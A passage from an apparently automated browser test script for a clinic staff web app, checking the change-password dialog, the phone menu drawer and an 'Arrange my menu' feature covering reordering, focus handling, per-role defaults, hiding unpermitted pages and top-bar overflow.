  assert.equal(await login.getAttribute('readonly'), '');
  assert.equal(await login.getAttribute('aria-hidden'), 'true');
  assert.equal(await login.getAttribute('tabindex'), '-1');
  assert.equal(await pwLate.evaluate(() => document.activeElement?.getAttribute('autocomplete')), 'current-password');
  assert.equal(await dialog.locator('form').count(), 1);
  assert.match(await dialog.innerText(), /other computers or phones, they will be logged out and need the new password/);
});
await step('while the change is being sent the dialog cannot be closed (Escape, the x, a click outside), and says it is working', async () => {
  await pwLate.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const original = state.data.changeOwnPassword.bind(state.data);
    state.data.changeOwnPassword = async (...args) => { await new Promise((r) => setTimeout(r, 1500)); return original(...args); };
  });
  await changeFill(pwLate, 'old-pass-1', 'late-pass-11', 'late-pass-11');
  await changeSubmit(pwLate);
  await pwLate.waitForSelector('.modal[aria-busy="true"]');
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Changing…');
  await pwLate.keyboard.press('Escape');
  await changeDialog(pwLate).getByRole('button', { name: 'Close' }).click();
  await pwLate.mouse.click(4, 4); // the grey area outside
  await pwLate.waitForTimeout(300);
  assert.equal(await changeDialog(pwLate).count(), 1, 'still open while sending');
  await pwLate.waitForSelector('.toast:has-text("Password changed")');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await pwLate.locator('.modal').count(), 0);
});
await step('when the change fails the label is back and the dialog can be closed again', async () => {
  await changeOpen(pwLate);
  await changeFill(pwLate, 'not-the-one', 'again-pass-22', 'again-pass-22');
  await changeSubmit(pwLate);
  await changeField(pwLate, 'Current password').locator('.field-error').waitFor();
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Change password');
  assert.equal(await changeDialog(pwLate).getAttribute('aria-busy'), null);
  await pwLate.keyboard.press('Escape');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
});
// A phone: touch input, so the touch sizes of the stylesheet apply. The admin has the longest menu, so the drawer scrolls.
const pwTouch = await newPage({ width: 375, height: 812 }, { isMobile: true, hasTouch: true });
await step('on a phone the drawer keeps "Change password" and "Log out" on screen, well apart, and "Show the new password" is a full-size tap target', async () => {
  await loginAs(pwTouch, 'Dr. Ali Rashid');
  await pwTouch.locator('.menu-toggle').tap();
  await pwTouch.waitForSelector('#staff-drawer.open');
  const drawer = await pwTouch.locator('#staff-drawer').evaluate((el) => ({ scrolls: el.scrollHeight > el.clientHeight + 1 }));
  assert.ok(drawer.scrolls, 'the menu is longer than the screen, so this checks the sticky foot');
  const change = await pwTouch.locator('.sidebar-foot button:has-text("Change password")').boundingBox();
  const out = await pwTouch.locator('.sidebar-foot button:has-text("Log out")').boundingBox();
  assert.ok(change.y + change.height <= 812 && out.y + out.height <= 812, `both are on screen without scrolling (at ${Math.round(change.y)} and ${Math.round(out.y)} of 812)`);
  assert.ok(out.x - (change.x + change.width) >= 24, 'a slip of the finger on "Change password" does not log out');
  await shot(pwTouch, '17-drawer-sticky-foot');
  await pwTouch.locator('.sidebar-foot button:has-text("Change password")').tap();
  await pwTouch.waitForSelector('.modal h2:has-text("Change password")');
  const row = await changeDialog(pwTouch).locator('label.show-passwords').boundingBox();
  assert.ok(row.height >= 44, `the "Show the new password" row is ${Math.round(row.height)}px tall`);
  await pwTouch.keyboard.press('Escape');
  await pwTouch.waitForSelector('.modal', { state: 'detached' });
});

// ------------------------------------------------------------- Arrange my menu (owner's request, 12 Oct 2026)
// One page for the whole story: its localStorage is "this computer" (the copy that draws the menu at once), and the demo data in
// it plays the database (reset by a reload, like a new computer that has the copy but not the row).
const pn = await newPage();
const barLabels = (pg) => pg.locator('.topnav > a, .topnav > .menu > button').evaluateAll((els) => els.map((el) => {
  const c = el.cloneNode(true);
  c.querySelectorAll('.sr-only, .caret').forEach((x) => x.remove());
  return c.textContent.trim();
}));
const arrangeDialog = (pg) => pg.locator('.modal:has(h2:text-is("Arrange my menu"))');
const topRows = (pg) => arrangeDialog(pg).locator('ol.arrange-list > li .arrange-name').evaluateAll((els) => els.map((el) => el.firstChild.textContent.trim()));
const focusedName = (pg) => pg.evaluate(() => document.activeElement?.getAttribute('aria-label') || document.activeElement?.textContent.trim());
// Every section of "Not on the top bar" is an element: an empty one must leave nothing behind (it once showed the word "null").
const noStrayText = async (pg) => {
  assert.ok(!/\bnull\b/.test(await arrangeDialog(pg).innerText()), 'no "null" in the dialog');
  assert.deepEqual(await arrangeDialog(pg).locator('.arrange-rest').evaluate((el) => [...el.childNodes].filter((n) => n.nodeType !== 1).map((n) => n.textContent)), [], 'no loose text between its sections');
};
// A press in the dialog's first 400 ms is taken for the second click of a double-click on "Arrange my menu" and does nothing
// (nav-arrange.js): a person never aims at one of its buttons that fast, this test does. So it waits that moment out first.
const arrangeOpened = async (pg) => { await arrangeDialog(pg).waitFor(); await pg.waitForTimeout(450); };
const openArrange = async (pg) => {
  await pg.locator('.user-menu > button').click();
  await pg.locator('.user-menu .menu-list button:has-text("Arrange my menu")').click();
  await arrangeOpened(pg);
};
const saveArrange = async (pg, expectBar) => {
  await arrangeDialog(pg).getByRole('button', { name: 'Save', exact: true }).click();
  await arrangeDialog(pg).waitFor({ state: 'detached' });
  await pg.waitForSelector('.toast:has-text("Menu saved")');
  if (expectBar) await pg.waitForFunction((want) => [...document.querySelectorAll('.topnav > a, .topnav > .menu > button')].map((el) => {
    const c = el.cloneNode(true); c.querySelectorAll('.sr-only, .caret').forEach((x) => x.remove()); return c.textContent.trim();
  }).join('|') === want, expectBar.join('|'));
};
const ADMIN_BAR = ['Today', 'Aaj ki List', 'Patients', 'Billing', 'Reports', 'Coordinator', 'More'];
const ADMIN_TOP_ROWS = ['Today', 'Aaj ki List drop-down', 'Patients', 'Billing', 'Reports drop-down', 'Coordinator drop-down'];
let fdDefault = [];
await step('Arrange my menu: the front desk\'s menu before anyone arranges anything (its own default)', async () => {
  await loginAs(pn, 'Front desk \\(Gulshan\\)');
  fdDefault = await barLabels(pn);
  assert.deepEqual(fdDefault, ['Today', 'Aaj ki List', 'Patients', 'Billing', 'Reports', 'Coordinator']);
  await tryAnotherRole(pn);
});
await step('Arrange my menu: in the name menu above "Change password"; the dialog shows the top bar in order and every other page Dr. Ali may open', async () => {
  await loginAs(pn, 'Dr. Ali Rashid');
  assert.deepEqual(await barLabels(pn), ADMIN_BAR);
  await shot(pn, '18-top-bar-before');
  await pn.locator('.user-menu > button').click();
  assert.deepEqual((await pn.locator('.user-menu .menu-list button').allTextContents()).map((t) => t.trim()), ['Arrange my menu', 'Change password', 'Log out']);
  await pn.locator('.user-menu .menu-list button:has-text("Arrange my menu")').click();
  await arrangeOpened(pn);
  assert.equal(await pn.locator('.user-menu.open').count(), 0, 'the menu closed behind the dialog');
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
  const rest = arrangeDialog(pn).locator('.arrange-rest');
  for (const name of ['Queue board (Aaj ki List)', 'Financial (Reports)', 'Reminders (Coordinator)', 'Stock', 'Audit log']) {
    assert.equal(await rest.getByRole('button', { name: `Put on the top bar: ${name}`, exact: true }).count(), 1, name);
  }
  // (By the start of its name only: the Import page's name lists what it imports, and that list grows.)
  assert.equal(await rest.getByRole('button', { name: /^Put on the top bar: Import \(Healthwire/ }).count(), 1, 'Import');
  assert.match(await arrangeDialog(pn).innerText(), /A long top bar may not fit on a small laptop screen/);
  await noStrayText(pn);
  assert.equal(await focusedName(pn), 'On the top bar', 'focus starts at the top-bar list');
  await shot(pn, '19-arrange-dialog');
});
const movedRows = (pg) => arrangeDialog(pg).locator('.arrange-moved .arrange-name').evaluateAll((els) => els.map((el) => el.firstChild.textContent.trim()));
const saidInDialog = (pg, text) => pg.waitForFunction((want) => [...document.querySelectorAll('.modal [role="status"]')].some((r) => r.textContent === want), text);
await step('Arrange my menu: a double-click on "Move up" moves the page one place, and clicks at one spot keep moving the same page', async () => {
  const d = arrangeDialog(pn);
  // Many people double-click every button. After the first click the next page's button is under the pointer: the second click
  // must not move that one (which put both pages back where they were).
  await d.getByRole('button', { name: 'Move up: Patients', exact: true }).dblclick();
  assert.deepEqual(await topRows(pn), ['Today', 'Patients', 'Aaj ki List drop-down', 'Billing', 'Reports drop-down', 'Coordinator drop-down']);
  assert.deepEqual(await movedRows(pn), ['Patients']);
  assert.equal(await focusedName(pn), 'Move up: Patients', 'focus stays on the moved page, not on the button the second click landed on');
  await saidInDialog(pn, 'Patients: number 2 of 6 on the top bar.');
  await d.getByRole('button', { name: 'Move down: Patients', exact: true }).dblclick();
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
  assert.deepEqual(await movedRows(pn), ['Patients']);
  assert.equal(await focusedName(pn), 'Move down: Patients');
  await d.getByRole('button', { name: 'Move up: Billing', exact: true }).dblclick();
  assert.deepEqual(await topRows(pn), ['Today', 'Aaj ki List drop-down', 'Billing', 'Patients', 'Reports drop-down', 'Coordinator drop-down']);
  // Single clicks at one spot: the dialog scrolls with the moved page, so its button stays under the pointer.
  const clicksAt = async (name, times) => {
    const box = await d.getByRole('button', { name, exact: true }).boundingBox();
    for (let n = 0; n < times; n++) await pn.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
    assert.equal(await focusedName(pn), name);
    const now = await d.getByRole('button', { name, exact: true }).boundingBox();
    assert.ok(Math.abs(now.y - box.y) <= 2, `${name} is still under the pointer (moved ${Math.round(now.y - box.y)} px)`);
  };
  await clicksAt('Move down: Today', 2);
  assert.deepEqual((await topRows(pn)).slice(0, 4), ['Aaj ki List drop-down', 'Billing', 'Today', 'Patients']);
  assert.deepEqual(await movedRows(pn), ['Today']);
  await clicksAt('Move up: Today', 2);
  assert.deepEqual((await topRows(pn)).slice(0, 4), ['Today', 'Aaj ki List drop-down', 'Billing', 'Patients']);
  await d.getByRole('button', { name: 'Move down: Billing', exact: true }).dblclick();
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS, 'back to the clinic\'s order');
  await d.locator('.modal-body').evaluate((el) => { el.scrollTop = 0; });
});
await step('Arrange my menu: clicks at one spot take the same page all the way to the top and back, with the dialog scrolled to the top (it cannot scroll up any further)', async () => {
  const d = arrangeDialog(pn);
  const body = d.locator('.modal-body');
  const lift = () => d.locator('ol.arrange-list').evaluate((el) => parseFloat(el.style.paddingTop || '0'));
  // The name of the button under the pointer.
  const under = ([x, y]) => pn.evaluate(([px, py]) => document.elementFromPoint(px, py)?.closest('button')?.getAttribute('aria-label') || null, [x, y]);
  const spot = async (name) => { const b = await d.getByRole('button', { name, exact: true }).boundingBox(); return [b.x + b.width / 2, b.y + b.height / 2]; };
  const where = async () => (await topRows(pn)).indexOf('Coordinator drop-down');
  assert.equal(await body.evaluate((el) => el.scrollTop), 0);
  const up = await spot('Move up: Coordinator drop-down');
  for (let n = 1; n <= 5; n++) {
    await pn.mouse.click(...up);
    assert.equal(await where(), 5 - n, `click ${n} moved it one more place up`);
    assert.equal(await under(up), 'Move up: Coordinator drop-down', `after click ${n} its own button is still under the pointer`);
    assert.deepEqual(await movedRows(pn), ['Coordinator drop-down']);
  }
  assert.deepEqual(await topRows(pn), ['Coordinator drop-down', ...ADMIN_TOP_ROWS.slice(0, 5)]);
  assert.equal(await focusedName(pn), 'Move up: Coordinator drop-down', 'focus stays on the pressed button');
  assert.equal(await body.evaluate((el) => el.scrollTop), 0, 'the dialog could not scroll up: space above the list took its place');
  assert.ok((await lift()) > 0);
  await pn.mouse.click(...up);
  assert.equal(await where(), 0, 'a click too many leaves it first');
  await saidInDialog(pn, 'Coordinator drop-down is already first on the top bar.');
  await shot(pn, '19b-clicks-at-one-spot');
  // Back down the same way: the space above the list shrinks again and is gone at the last place.
  const down = await spot('Move down: Coordinator drop-down');
  for (let n = 1; n <= 5; n++) {
    await pn.mouse.click(...down);
    assert.equal(await where(), n, `click ${n} moved it one more place down`);
    assert.equal(await under(down), 'Move down: Coordinator drop-down', `after click ${n} its own button is still under the pointer`);
  }
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
  assert.ok((await lift()) < 1, `no space left above the list (${await lift()} px)`);
  // Clicking fast: the browser counts the clicks of a quick series (1, 2, 3, 4). The second one, which makes a double-click, is left
  // alone; the ones after it go on moving the same page.
  const fast = await spot('Move up: Coordinator drop-down');
  await pn.mouse.click(...fast, { clickCount: 4 });
  assert.equal(await where(), 2, 'four quick clicks: three places up');
  assert.equal(await under(fast), 'Move up: Coordinator drop-down');
  // The keyboard afterwards: focus stays on the pressed button, also at the first place, and the space above the list goes.
  assert.ok((await lift()) > 0);
  await pn.keyboard.press('Enter');
  await pn.keyboard.press('Enter');
  await pn.keyboard.press('Enter');
  assert.equal(await where(), 0);
  assert.equal(await focusedName(pn), 'Move up: Coordinator drop-down');
  assert.equal(await lift(), 0, 'a change made with the keyboard takes the space away');
  const toLast = async () => {
    await d.getByRole('button', { name: 'Move down: Coordinator drop-down', exact: true }).focus();
    for (let n = 0; n < 6; n++) await pn.keyboard.press('Enter');
    assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
    assert.equal(await focusedName(pn), 'Move down: Coordinator drop-down', 'at the last place focus stays on its row');
  };
  await toLast();
  // Scrolled past the space above the list (here to the very end), the space goes without anything on the screen moving.
  await body.evaluate((el) => { el.scrollTop = 0; });
  const again = await spot('Move up: Coordinator drop-down');
  await pn.mouse.click(...again);
  await pn.mouse.click(...again);
  assert.ok((await lift()) > 0);
  const seen = await body.evaluate((el) => { el.scrollTop = el.scrollHeight; return el.querySelector('[aria-label="Put on the top bar: Audit log"]').getBoundingClientRect().top; });
  await pn.waitForFunction(() => !document.querySelector('.modal ol.arrange-list').style.paddingTop);
  const now = (await d.getByRole('button', { name: 'Put on the top bar: Audit log', exact: true }).boundingBox()).y;
  assert.ok(Math.abs(now - seen) <= 1, `the last button stayed where it was (moved ${Math.round(now - seen)} px)`);
  await toLast();
  await body.evaluate((el) => { el.scrollTop = 0; });
});
await step('Arrange my menu: "Move up" moves a page up, its row stands out and focus stays on it, also with the keyboard; one Enter too many does not move it back', async () => {
  const d = arrangeDialog(pn);
  await d.getByRole('button', { name: 'Move up: Patients', exact: true }).click();
  assert.deepEqual((await topRows(pn)).slice(0, 3), ['Today', 'Patients', 'Aaj ki List drop-down']);
  assert.equal(await focusedName(pn), 'Move up: Patients');
  // After a click the button under the pointer belongs to the next page: the moved row shows where Patients went.
  assert.deepEqual(await movedRows(pn), ['Patients']);
  assert.notEqual(await d.locator('.arrange-moved').evaluate((el) => getComputedStyle(el).backgroundColor),
    await d.locator('ol.arrange-list > li:not(.arrange-moved)').first().evaluate((el) => getComputedStyle(el).backgroundColor), 'the moved row looks different');
  await pn.keyboard.press('Enter');
  assert.deepEqual((await topRows(pn)).slice(0, 3), ['Patients', 'Today', 'Aaj ki List drop-down']);
  const up = d.getByRole('button', { name: 'Move up: Patients', exact: true });
  assert.equal(await up.getAttribute('aria-disabled'), 'true', 'the first row cannot move up');
  assert.equal(await focusedName(pn), 'Move up: Patients', 'focus stays on the button that was pressed');
  await pn.keyboard.press('Enter');
  await pn.keyboard.press('Enter');
  assert.deepEqual((await topRows(pn)).slice(0, 3), ['Patients', 'Today', 'Aaj ki List drop-down'], 'more presses leave it first');
  assert.equal(await focusedName(pn), 'Move up: Patients');
  await saidInDialog(pn, 'Patients is already first on the top bar.');
});
await step('Arrange my menu: a page from More goes on the top bar (last), a whole drop-down goes under More; a click keeps the place in the list, the keyboard follows the page', async () => {
  const d = arrangeDialog(pn);
  const body = d.locator('.modal-body');
  const stock = d.getByRole('button', { name: 'Put on the top bar: Stock', exact: true });
  await stock.scrollIntoViewIfNeeded();
  const was = (await stock.boundingBox()).y;
  const scrolled = await body.evaluate((el) => el.scrollTop);
  await stock.click();
  assert.equal((await topRows(pn)).at(-1), 'Stock');
  assert.deepEqual(await movedRows(pn), ['Stock']);
  // The dialog does not scroll up to the top-bar list: the next page of More is where the pointer is, ready for the next click.
  assert.equal(await focusedName(pn), 'Put on the top bar: Complaints');
  assert.ok(Math.abs((await pn.evaluate(() => document.activeElement.getBoundingClientRect().top)) - was) <= 2, 'Complaints took the place of Stock');
  assert.ok((await body.evaluate((el) => el.scrollTop)) >= scrolled, 'the dialog did not jump up');
  await saidInDialog(pn, 'Stock is now last on the top bar, number 7.');
  const coordinator = d.getByRole('button', { name: 'Put in More: Coordinator drop-down', exact: true });
  await coordinator.focus();
  await pn.keyboard.press('Enter');
  assert.deepEqual(await topRows(pn), ['Patients', 'Today', 'Aaj ki List drop-down', 'Billing', 'Reports drop-down', 'Stock']);
  assert.equal(await focusedName(pn), 'Put on the top bar: Coordinator drop-down', 'with the keyboard focus follows the page');
  assert.match(await d.locator('.arrange-rest').innerText(), /Coordinator · under More/);
});
const ARRANGED = ['Patients', 'Today', 'Aaj ki List', 'Billing', 'Reports', 'Stock', 'More'];
await step('Arrange my menu: Save changes the top bar at once, More keeps the Coordinator pages under their name, and a reload keeps it', async () => {
  await saveArrange(pn, ARRANGED);
  await pn.locator('.topnav .menu:has(> button:has-text("More")) > button').click();
  const list = pn.locator('.topnav .menu.open .menu-list');
  assert.equal((await list.locator('.menu-heading').allTextContents()).join('|'), 'Coordinator');
  assert.equal(await list.locator('a:text-is("Reminders")').count(), 1);
  assert.equal(await list.locator('a:text-is("Stock")').count(), 0, 'Stock is on the top bar now, not under More');
  await shot(pn, '20-top-bar-after');
  await pn.keyboard.press('Escape');
  // A reload starts the demo afresh (logged out, nothing saved in its data): the copy on this computer draws the arranged menu.
  await pn.reload();
  await loginAs(pn, 'Dr. Ali Rashid');
  assert.deepEqual(await barLabels(pn), ARRANGED);
  await pn.locator('.topnav > a:text-is("Stock")').click();
  await pn.waitForSelector('h1:has-text("Stock")');
  assert.equal(await pn.locator('.topnav > a:text-is("Stock")').getAttribute('aria-current'), 'page', 'the pinned link shows the page on screen');
});
await step('Arrange my menu: "Reset to default" brings back the clinic\'s menu, in the database too', async () => {
  await openArrange(pn);
  await arrangeDialog(pn).getByRole('button', { name: 'Reset to default' }).click();
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
  assert.equal(await focusedName(pn), 'On the top bar');
  await saveArrange(pn, ADMIN_BAR);
  assert.equal(await pn.evaluate(() => localStorage.getItem('staff-menu:s-admin')), '[]');
  assert.deepEqual(await pn.evaluate(async () => (await import('/js/state.js')).state.data.myMenuArrangement()), []);
});
await step('Arrange my menu: a double-click on "Arrange my menu" opens the dialog and leaves it open; the keyboard is not kept waiting', async () => {
  // The second click lands on the backdrop, where "Arrange my menu" was: it used to close the dialog again at once.
  await pn.locator('.user-menu > button').click();
  const item = pn.locator('.user-menu .menu-list button:has-text("Arrange my menu")');
  const box = await item.boundingBox();
  const spot = [box.x + box.width / 2, box.y + box.height / 2];
  await item.dblclick();
  await arrangeDialog(pn).waitFor();
  assert.equal(await pn.evaluate(([x, y]) => document.elementFromPoint(x, y)?.className, spot), 'modal-backdrop', 'the second click landed on the backdrop');
  await pn.waitForTimeout(500);
  assert.equal(await arrangeDialog(pn).count(), 1, 'the dialog is still open');
  assert.equal(await focusedName(pn), 'On the top bar', 'focus is where the dialog put it');
  assert.equal(await pn.evaluate(() => getSelection().toString()), '', 'no word selected');
  assert.deepEqual(await topRows(pn), ADMIN_TOP_ROWS);
  // The moment over, a click on the backdrop closes it as before.
  await pn.mouse.click(...spot);
  await arrangeDialog(pn).waitFor({ state: 'detached' });
  // A slow double-click (its second click after that moment, still counted as a double-click by the browser) leaves it open too.
  await pn.locator('.user-menu > button').click();
  await item.click();
  await arrangeDialog(pn).waitFor();
  await pn.waitForTimeout(450);
  await pn.mouse.down({ clickCount: 2 });
  await pn.mouse.up({ clickCount: 2 });
  await pn.waitForTimeout(100);
  assert.equal(await arrangeDialog(pn).count(), 1, 'a slow double-click: still open');
  await pn.keyboard.press('Escape');
  await arrangeDialog(pn).waitFor({ state: 'detached' });
  // Opened with Enter, the dialog takes the keyboard at once: Move down for Today, pressed right away, moves it.
  await pn.locator('.user-menu > button').click();
  await item.focus();
  await pn.keyboard.press('Enter');
  await arrangeDialog(pn).waitFor();
  await pn.keyboard.press('Tab');
  await pn.keyboard.press('Tab');
  assert.equal(await focusedName(pn), 'Move down: Today');
  await pn.keyboard.press('Enter');
  assert.deepEqual((await topRows(pn)).slice(0, 2), ['Aaj ki List drop-down', 'Today'], 'Enter acted at once');
  await pn.keyboard.press('Escape');
  await arrangeDialog(pn).waitFor({ state: 'detached' });
  assert.deepEqual(await barLabels(pn), ADMIN_BAR, 'nothing was saved');
});
await step('Arrange my menu: the Aaj ki List page put on the top bar beside its drop-down reads "Aaj ki List (today)", so no name is on the bar twice', async () => {
  await openArrange(pn);
  const d = arrangeDialog(pn);
  await d.getByRole('button', { name: 'Put on the top bar: Aaj ki List (today)', exact: true }).click();
  assert.equal((await topRows(pn)).at(-1), 'Aaj ki List (today)', 'the dialog calls it what the top bar will');
  assert.match(await d.locator('ol.arrange-list > li', { hasText: 'Aaj ki List drop-down' }).innerText(), /History of Aaj ki List, Queue board, Checkups/);
  const bar = [...ADMIN_BAR.slice(0, -1), 'Aaj ki List (today)', 'More'];
  await saveArrange(pn, bar);
  assert.equal(new Set(bar).size, bar.length);
  // The drop-down keeps its name and its other pages; the link opens today's Aaj ki List and shows it is the page on screen.
  await pn.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').click();
  assert.deepEqual((await pn.locator('.topnav .menu.open .menu-list a').allTextContents()).map((t) => t.trim()), ['History of Aaj ki List', 'Queue board', 'Checkups']);
  await pn.keyboard.press('Escape');
  await pn.locator('.topnav > a:text-is("Aaj ki List (today)")').click();
  await pn.waitForSelector('h1:text-is("Aaj ki List")');
  assert.equal(await pn.locator('.topnav > a:text-is("Aaj ki List (today)")').getAttribute('aria-current'), 'page');
  assert.deepEqual(await barLabels(pn), bar);
  await shot(pn, '20b-aaj-ki-list-pinned');
  // Back to the clinic's menu for the steps below.
  await openArrange(pn);
  await arrangeDialog(pn).getByRole('button', { name: 'Reset to default' }).click();
  await saveArrange(pn, ADMIN_BAR);
});
await step('Arrange my menu: another role sees its own default, not Dr. Ali\'s arrangement', async () => {
  await openArrange(pn);
  await arrangeDialog(pn).getByRole('button', { name: 'Put on the top bar: Audit log', exact: true }).click();
  await saveArrange(pn, [...ADMIN_BAR.slice(0, -1), 'Audit log', 'More']);
  await tryAnotherRole(pn);
  await loginAs(pn, 'Front desk \\(Gulshan\\)');
  assert.deepEqual(await barLabels(pn), fdDefault);
  await openArrange(pn);
  const text = await arrangeDialog(pn).innerText();
  for (const word of ['Audit log', 'Stock', 'Staff accounts', 'Financial']) assert.ok(!text.includes(word), `the front desk's dialog has no ${word}`);
  await noStrayText(pn); // its "Main pages" and "More" sections are both empty
  await pn.keyboard.press('Escape');
  await arrangeDialog(pn).waitFor({ state: 'detached' });
});
await step('Arrange my menu: a page the person may not open never appears, even when their saved list names it', async () => {
  // A copy on this computer naming pages the front desk may not open (as if written by hand, or saved before access was taken away).
  await pn.evaluate(() => localStorage.setItem('staff-menu:s-fd-gul', JSON.stringify(['admin?tab=staff', 'complaints', 'patients', 'stock', 'today', 'menu:sheet', 'billing', 'menu:reports', 'menu:coordinator', 'admin?tab=audit'])));
  await pn.goto(BASE + '#/staff/patients');
  await pn.waitForSelector('h1:has-text("Patients")');
  assert.deepEqual(await barLabels(pn), ['Patients', ...fdDefault.filter((l) => l !== 'Patients')], 'only the page it may open moved');
  const menus = (await pn.locator('.topnav, #staff-drawer').allTextContents()).join(' ');
  for (const word of ['Staff accounts', 'Complaints', 'Stock', 'Audit log']) assert.ok(!menus.includes(word), `${word} is not in the menu`);
  assert.equal(await pn.evaluate(() => [...document.querySelectorAll('a[href]')].filter((a) => /#\/staff\/(admin|stock|complaints)/.test(a.getAttribute('href'))).length), 0);
});
await step('Arrange my menu: when Dr. Ali takes a page away from someone, it leaves their arranged top bar too', async () => {
  await openArrange(pn);
  await arrangeDialog(pn).getByRole('button', { name: 'Put on the top bar: Reminders (Coordinator)', exact: true }).click();
  await saveArrange(pn, ['Patients', ...fdDefault.filter((l) => l !== 'Patients'), 'Reminders']);
  await tryAnotherRole(pn);
  await loginAs(pn, 'Dr. Ali Rashid');
  await pn.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-gul', 'reminders.manage', false); });
  await tryAnotherRole(pn);
  await loginAs(pn, 'Front desk \\(Gulshan\\)');
  // Reminders leaves the bar; the rest keeps its order. The Coordinator drop-down stays only while it has another page the front
  // desk may open, so it is left out of the comparison.
  const bar = await barLabels(pn);
  assert.ok(!bar.includes('Reminders'));
  assert.deepEqual(bar.filter((l) => l !== 'Coordinator'), ['Patients', ...fdDefault.filter((l) => l !== 'Patients' && l !== 'Coordinator')]);
  const menus = (await pn.locator('.topnav, #staff-drawer').allTextContents()).join(' ');
  assert.ok(!menus.includes('Reminders') && !menus.includes('Drop-offs'), 'Reminders is gone from every menu');
  await openArrange(pn);
  assert.ok(!(await arrangeDialog(pn).innerText()).includes('Reminders'), 'and from the dialog');
  await pn.keyboard.press('Escape');
});
// A 1366 x 768 laptop: Dr. Ali pins far more than fits.
const pnLaptop = await newPage({ width: 1366, height: 768 });
const MANY = ['today', 'menu:sheet', 'patients', 'billing', 'menu:reports', 'menu:coordinator', 'stock', 'complaints', 'review', 'log',
  'admin?tab=staff', 'admin?tab=audit', 'coordinator?tab=reminders', 'reports?group=financial'];
await step('Arrange my menu: a top bar too long for a 1366px laptop moves its last pages into More by themselves, and takes them back on a wider screen', async () => {
  await pnLaptop.goto(BASE + '#/login/staff');
  await pnLaptop.evaluate((list) => localStorage.setItem('staff-menu:s-admin', JSON.stringify(list)), MANY);
  await loginAs(pnLaptop, 'Dr. Ali Rashid');
  const fits = () => pnLaptop.evaluate(() => { const b = document.querySelector('.topbar'); return b.scrollWidth <= b.clientWidth + 1; });
  assert.ok(await fits(), 'the top bar fits on one line');
  const shown = await barLabels(pnLaptop);
  assert.equal(shown.at(-1), 'More');
  assert.ok(shown.length < 15 && shown.length > 7, `some of the 14 pinned are on the bar (${shown.length - 1})`);
  // Every pinned page is still one or two clicks away: on the bar, or in a drop-down of it.
  const inMenus = await pnLaptop.locator('.topnav .menu-list a').allTextContents();
  for (const label of ['Stock', 'Complaints', "Dr. Ali's list", 'Doctor log', 'Staff accounts', 'Audit log', 'Reminders', 'Financial']) {
    assert.ok(shown.includes(label) || inMenus.includes(label), `${label} can be reached`);
  }
  await shot(pnLaptop, '21-top-bar-too-long');
  await pnLaptop.setViewportSize({ width: 1920, height: 900 });
  await pnLaptop.waitForFunction((n) => document.querySelectorAll('.topnav > a, .topnav > .menu > button').length > n, shown.length);
  assert.ok(await fits());
  await pnLaptop.setViewportSize({ width: 1366, height: 768 });
  await pnLaptop.waitForFunction((n) => document.querySelectorAll('.topnav > a, .topnav > .menu > button').length === n, shown.length);
  assert.ok(await fits());
});
// A phone: the drawer shows the same order, and the dialog fits.
const pnPhone = await newPage({ width: 390, height: 844 });
await step('Arrange my menu on a phone: the drawer follows the arrangement and has "Arrange my menu" after its links; the dialog fits the screen', async () => {
  await pnPhone.goto(BASE + '#/login/staff');
  await pnPhone.evaluate(() => localStorage.setItem('staff-menu:s-admin', JSON.stringify(['patients', 'stock', 'today', 'menu:sheet', 'billing', 'menu:reports', '-menu:coordinator'])));
  await loginAs(pnPhone, 'Dr. Ali Rashid');
  await pnPhone.locator('.menu-toggle').click();
  await pnPhone.waitForSelector('#staff-drawer.open');
  const first = async () => (await pnPhone.locator('#staff-drawer .drawer-links > a.nav-link').allTextContents()).map((t) => t.trim());
  assert.deepEqual(await first(), ['Patients', 'Stock', 'Today', 'Billing']);
  const groups = (await pnPhone.locator('#staff-drawer .drawer-group > .nav-group:not(.nav-subgroup)').allTextContents()).map((t) => t.trim());
  assert.deepEqual(groups, ['Aaj ki List', 'Reports', 'More']);
  assert.equal(await pnPhone.locator('#staff-drawer .nav-subgroup:text-is("Coordinator")').count(), 1, 'More names the Coordinator pages');
  await shot(pnPhone, '22-drawer-arranged');
  // Below the last link, not in the foot that stays on screen (that one keeps Change password and Log out).
  const arrange = pnPhone.locator('#staff-drawer > button:text-is("Arrange my menu")');
  assert.equal(await pnPhone.locator('.sidebar-foot :text-is("Arrange my menu")').count(), 0);
  await arrange.click();
  await arrangeDialog(pnPhone).waitFor();
  assert.equal(await pnPhone.locator('#staff-drawer.open').count(), 0, 'the drawer closed behind the dialog');
  const box = await arrangeDialog(pnPhone).boundingBox();
  assert.ok(box.x >= 0 && box.x + box.width <= 390, 'the dialog fits the screen');
  assert.ok(await arrangeDialog(pnPhone).locator('.modal-body').evaluate((el) => el.scrollWidth <= el.clientWidth + 1), 'no sideways scrolling inside it');
  await shot(pnPhone, '23-arrange-dialog-phone');
  await pnPhone.keyboard.press('Escape');
  await arrangeDialog(pnPhone).waitFor({ state: 'detached' });
  assert.ok(await pnPhone.evaluate(() => document.activeElement?.classList.contains('menu-toggle')), 'focus is back on the menu button');
  // Saved from the phone: the drawer has the new order at once, and the page under it was not drawn again.
  await pnPhone.evaluate(() => { document.querySelector('main').dataset.kept = 'yes'; });
  await pnPhone.locator('.menu-toggle').click();
  await arrange.click();
  await arrangeOpened(pnPhone);
  await arrangeDialog(pnPhone).getByRole('button', { name: 'Put in More: Stock', exact: true }).click();
  await saveArrange(pnPhone);
  await pnPhone.locator('.menu-toggle').click();
  await pnPhone.waitForSelector('#staff-drawer.open');
  assert.deepEqual(await first(), ['Patients', 'Today', 'Billing']);
  assert.equal(await pnPhone.locator('main').getAttribute('data-kept'), 'yes', 'the page itself was not drawn again');
  await pnPhone.keyboard.press('Escape');
});
// Save draws only the menus again: an expense typed but not saved yet on the page under the dialog is still there.
const pnForm = await newPage();
